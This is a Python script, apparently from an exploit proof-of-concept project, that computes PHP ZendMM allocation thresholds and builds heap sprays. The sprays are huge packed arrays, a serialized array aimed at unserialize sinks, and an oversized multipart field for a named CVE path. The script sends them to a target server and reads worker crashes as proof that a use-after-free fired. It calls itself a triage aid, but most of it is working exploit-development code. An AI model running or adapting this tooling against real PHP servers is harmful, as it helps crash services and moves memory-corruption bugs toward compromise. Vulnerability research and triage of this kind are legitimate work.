#!/usr/bin/env python3
# INDEX: munmap huge-alloc deterministic-crash triage oracle | all | dangle must hit huge alloc
"""munmap SIGSEGV oracle - a reliability / triage aid (NOT an attack): it turns a
dangling pointer into a DETERMINISTIC crash so a flaky UAF reads as a clean N/N
worker-death signal.

MECHANISM
---------
ZendMM routes an allocation by size (Zend/zend_alloc.c, _zend_mm_alloc_heap):

    size <= ZEND_MM_MAX_SMALL_SIZE (3072)      -> small bins, inside a chunk
    size <= ZEND_MM_MAX_LARGE_SIZE (2093056)   -> large run of pages, in a chunk
    size  > ZEND_MM_MAX_LARGE_SIZE             -> zend_mm_alloc_huge -> mmap()

ZEND_MM_MAX_LARGE_SIZE is one chunk minus its first (metadata) page:
(ZEND_MM_PAGES - 1) * ZEND_MM_PAGE_SIZE = 511 * 4096 = 2093056. Anything larger
is a HUGE allocation: a direct mmap() of its own. zend_mm_free_huge() hands it
back with munmap() - the pages are UNMAPPED, not returned to a free-list.

A freed small/large allocation keeps its pages mapped, so a later dangling read
silently hits whatever got recycled there (survives, or crashes at random). A
freed HUGE allocation is munmap'd, so a later dangling read faults
DETERMINISTICALLY (SIGSEGV / SIGBUS) - unmapped pages have no PTE. Steering a
UAF's dangling pointer onto a HUGE (mmap'd) allocation (e.g. pre-spray a very
large packed array so the reclaim lands on its munmap'd backing) converts a
"sometimes silent, sometimes crash" bug into a reliable crash signal. classify()
reads the resulting worker death as that signal.

SCOPE / PRECONDITION
--------------------
The oracle makes a UAF deterministic only when the DANGLING POINTER ITSELF
references the huge allocation; it does not make every crash path deterministic.
It applies to UAFs whose reclaimed object is itself large/huge - e.g. the
CVE-2026-109618 multipart path, whose half-built object is a multi-MB field
buffer.

Verified on 8.4.26 (verify_munmap_sigsegv_oracle.py): array_fill(0,1500000,1) ->
a ~33 MiB mmap (>> threshold), munmap'd on free; a 1 MiB array stays in the
arena (no dedicated munmap); a dangling read of the munmap'd region -> SIGSEGV.

Pure stdlib, python3 -I safe. Uses a shared HTTP/multipart transport when
importable, otherwise a minimal local transport.
"""
import argparse
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

# --- ZendMM sizing constants (64-bit) ----------------------------------------
PAGE = 4096
ZVAL_SIZE = 16                       # sizeof(zval) on 64-bit
ZEND_MM_PAGE_SIZE = 4096
ZEND_MM_CHUNK_SIZE = 2 * 1024 * 1024  # 2 MiB chunk
ZEND_MM_PAGES = ZEND_MM_CHUNK_SIZE // ZEND_MM_PAGE_SIZE          # 512
# A large run can be at most (ZEND_MM_PAGES - 1) pages (page 0 is chunk
# metadata). Anything strictly larger is a HUGE (mmap'd) allocation.
ZEND_MM_MAX_LARGE_SIZE = (ZEND_MM_PAGES - 1) * ZEND_MM_PAGE_SIZE  # 2093056
HUGE_THRESHOLD = ZEND_MM_MAX_LARGE_SIZE                          # 2093056

# Default spray size: ~1.5M packed elements -> ~32 MiB arData, an order of
# magnitude over the huge threshold (plenty of margin against ASLR/rounding).
DEFAULT_ELEMS = 1_500_000

# --- transport: reuse the project helpers read-only when available -----------
try:
    from common.http_urllib import http as _http, worker_alive as _worker_alive
    from common.multipart import part_tuple as _part, multipart_default as _multipart
    _HAVE_PHP2SHELL = True
except Exception:                                    # pragma: no cover
    _HAVE_PHP2SHELL = False
    _BOUNDARY = "----munmaporacle7a3c"

    def _part(name, value, filename=None, ctype=None):
        hdrs = 'Content-Disposition: form-data; name="%s"' % name
        if filename is not None:
            hdrs += '; filename="%s"' % filename
        if ctype is not None:
            hdrs += "\r\nContent-Type: %s" % ctype
        return hdrs, value

    def _multipart(parts):
        chunks = []
        for hdrs, body in parts:
            chunks.append(("--%s\r\n%s\r\n\r\n" % (_BOUNDARY, hdrs)).encode())
            chunks.append(body if isinstance(body, bytes) else body.encode())
            chunks.append(b"\r\n")
        chunks.append(("--%s--\r\n" % _BOUNDARY).encode())
        body = b"".join(chunks)
        return body, {"Content-Type":
                      "multipart/form-data; boundary=%s" % _BOUNDARY,
                      "Content-Length": str(len(body))}

    def _http(url, data=None, headers=None, timeout=180):
        import urllib.error
        import urllib.request
        req = urllib.request.Request(url, data=data, headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:                       # noqa: BLE001
            return None, str(e).encode()


# --- arithmetic: will an allocation of N elements be routed to mmap? ----------
def next_pow2(n):
    """Smallest power of two >= n (>= 1)."""
    if n <= 1:
        return 1
    return 1 << ((n - 1).bit_length())


def packed_array_backing_bytes(nelems):
    """Estimated arData size for a PHP *packed* array of `nelems` elements.

    A packed array's bucket table is nTableSize * sizeof(zval), and nTableSize
    is rounded up to a power of two (min 8). We ignore the small HT header / the
    packed arrays' minimal hash region; the dominant term is the zval run. The
    kernel mmap for a huge allocation rounds up to a page and may add alignment
    slack (e.g. nelems=1500000 -> 2097152*16 = 33554432, observed mmap
    33558528 = +1 page), so the TRUE mapping is this value or a page larger -
    never smaller. Good enough to decide huge-vs-not with a wide margin.
    """
    return max(8, next_pow2(nelems)) * ZVAL_SIZE


def is_huge(size_bytes):
    """True if an allocation of `size_bytes` is routed to zend_mm_alloc_huge
    (a standalone mmap that is munmap'd on free)."""
    return size_bytes > HUGE_THRESHOLD


def array_is_huge(nelems):
    """True if a packed array of `nelems` elements has a huge (mmap'd) arData."""
    return is_huge(packed_array_backing_bytes(nelems))


def min_elems_for_huge():
    """Smallest element count whose packed arData crosses the huge threshold.

    next_pow2(n)*16 > 2093056  <=>  next_pow2(n) >= 131072  <=>  n >= 65537.
    """
    n = 2
    while not array_is_huge(n):
        n <<= 1
        if n > (1 << 40):                            # safety, never reached
            break
    # n is the first power-of-two count that is huge; the true minimum is
    # (n/2)+1 (the first count whose next_pow2 is n). Report that.
    return (n >> 1) + 1


# --- spray builders -----------------------------------------------------------
def huge_array_php(nelems=DEFAULT_ELEMS):
    """A PHP snippet that materializes a huge (mmap'd) packed array. For use in
    producers / labs that execute PHP, and for documentation. The comment names
    the resulting backing size and confirms it is over the huge threshold."""
    backing = packed_array_backing_bytes(nelems)
    assert is_huge(backing), (
        "nelems=%d -> %d B arData, NOT huge (threshold %d); raise nelems"
        % (nelems, backing, HUGE_THRESHOLD))
    return ("$x = array_fill(0, %d, 1); /* arData ~= %d B > %d (huge -> mmap; "
            "freed -> munmap -> dangling access faults deterministically) */"
            % (nelems, backing, HUGE_THRESHOLD))


def huge_serialized_array(nelems=None):
    """A PHP serialize() string encoding a packed array of `nelems` ints.

    unserialize()ing it reconstructs a packed array whose arData is a huge
    mmap'd allocation - directly usable against an unserialize sink (e.g. a
    maybe_unserialize()/session shape) to make the decoded object's backing a
    munmap-on-free region. Default size is the minimum that crosses the huge
    threshold plus a safety doubling.
    """
    if nelems is None:
        nelems = max(min_elems_for_huge() * 2, 200000)
    assert array_is_huge(nelems), "nelems=%d not huge" % nelems
    out = ["a:%d:{" % nelems]
    for i in range(nelems):
        out.append("i:%d;i:1;" % i)
    out.append("}")
    return "".join(out)


def huge_field_body(nbytes=3 * 1024 * 1024, name="f", fill=b"x"):
    """One multipart field of `nbytes` bytes (> huge threshold) -> a huge
    (mmap'd) zend_string on the target. Returns (body, headers). This is the
    CVE-2026-109618 shape, whose half-built object is itself a multi-MB buffer -
    the case where this oracle genuinely sharpens the crash."""
    assert is_huge(nbytes + 24 + 1), (
        "nbytes=%d yields a non-huge zend_string (threshold %d)"
        % (nbytes, HUGE_THRESHOLD))
    value = fill * nbytes if len(fill) == 1 else (fill * (nbytes // len(fill) + 1))[:nbytes]
    return _multipart([_part(name, value)])


# --- the oracle: read worker death as a deterministic dangling signal ---------
def _has_clean_fatal(body):
    if not body:
        return False
    if isinstance(body, str):
        body = body.encode("latin1", "replace")
    return (b"Allowed memory size" in body) or (b"Fatal error" in body)


def classify(alive_before, alive_after, status=None, body=None):
    """Classify a probe around a suspected dangling access.

    Returns (category, detail). Categories:
      segv-dangling    worker alive before the probe and dead after: a
                       deterministic dangling-pointer fault (the signal). On a
                       huge munmap'd region this is N/N reliable.
      survived-silent  worker still alive and no clean fatal: the dangling read
                       hit MAPPED memory (recycled chunk) - silent corruption or
                       no UAF. The non-deterministic case the oracle removes by
                       steering the dangle onto a huge (unmapped) region.
      soft-oom         worker alive and a clean fatal in the body: benign /
                       patched (soft-OOM reported at a safe point).
      precondition     worker was already dead before the probe (invalid run).
    """
    if not alive_before:
        return ("precondition", "worker was already dead before the probe")
    if not alive_after:
        return ("segv-dangling",
                "worker died across the probe: deterministic dangling-pointer "
                "fault (SIGSEGV/GPF on an unmapped huge region)")
    if _has_clean_fatal(body):
        return ("soft-oom",
                "worker alive, clean fatal reported: benign / patched soft-OOM")
    return ("survived-silent",
            "worker alive, no fatal: dangling read hit MAPPED (recycled) memory "
            "- silent corruption or no UAF (non-deterministic case)")


# --- thin driver --------------------------------------------------------------
def worker_alive(base, path="/index.php", timeout=8):
    if _HAVE_PHP2SHELL:
        return _worker_alive(base, timeout=timeout)
    s, _ = _http(base.rstrip("/") + path, timeout=timeout)
    return s == 200


def probe_huge_field(base, path="/poc.php", nbytes=3 * 1024 * 1024, timeout=180):
    """Send a huge-field request to `path` and report (status, body). The caller
    pairs this with worker_alive() before/after and classify()."""
    body, headers = huge_field_body(nbytes)
    return _http(base.rstrip("/") + path, data=body, headers=headers,
                 timeout=timeout)


def run_once(base, path="/poc.php", nbytes=3 * 1024 * 1024, timeout=180):
    """One oracle probe: liveness -> huge-field request -> liveness -> classify."""
    base = base.rstrip("/")
    before = worker_alive(base)
    status, body = probe_huge_field(base, path=path, nbytes=nbytes, timeout=timeout)
    after = worker_alive(base)
    cat, detail = classify(before, after, status, body)
    return {"before": before, "after": after, "status": status,
            "nbytes": nbytes, "category": cat, "detail": detail,
            "body_tail": (body[-160:] if body else b"")}


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="munmap SIGSEGV oracle: build an oversized (huge/mmap'd) "
                    "array or field spray and read worker death as a "
                    "deterministic dangling-pointer signal (triage aid, not an "
                    "attack).")
    ap.add_argument("--url", default="http://127.0.0.1:8102",
                    help="target base URL (default: disposable lab on :8102)")
    ap.add_argument("--path", default="/poc.php",
                    help="request path for the huge-field probe")
    ap.add_argument("--nbytes", type=int, default=3 * 1024 * 1024,
                    help="huge-field size in bytes (must exceed %d)"
                         % HUGE_THRESHOLD)
    ap.add_argument("--elems", type=int, default=DEFAULT_ELEMS,
                    help="packed-array element count (for the --show spray info)")
    ap.add_argument("--show", action="store_true",
                    help="print the spray arithmetic/snippets and exit (no net)")
    args = ap.parse_args(argv)

    print("[oracle] HUGE_THRESHOLD = %d B (ZEND_MM_MAX_LARGE_SIZE = (%d-1)*%d)"
          % (HUGE_THRESHOLD, ZEND_MM_PAGES, ZEND_MM_PAGE_SIZE))
    print("[oracle] min elements for a huge packed array: %d" % min_elems_for_huge())
    backing = packed_array_backing_bytes(args.elems)
    print("[oracle] array_fill(0, %d, 1): arData ~= %d B -> huge=%s"
          % (args.elems, backing, is_huge(backing)))
    if args.show:
        print("[oracle] PHP spray: %s" % huge_array_php(args.elems))
        print("[oracle] (serialized-array and huge-field builders also available)")
        return

    print("[oracle] probing %s%s with a %d-byte huge field"
          % (args.url, args.path, args.nbytes))
    r = run_once(args.url, path=args.path, nbytes=args.nbytes)
    print("[oracle] worker alive before=%s after=%s (HTTP %s)"
          % (r["before"], r["after"], r["status"]))
    tail = r["body_tail"].decode("utf-8", "replace").strip()
    if tail:
        print("[oracle] body tail: %r" % tail)
    print("[oracle] category: %s" % r["category"])
    print("[oracle] -> %s" % r["detail"])


if __name__ == "__main__":
    main()
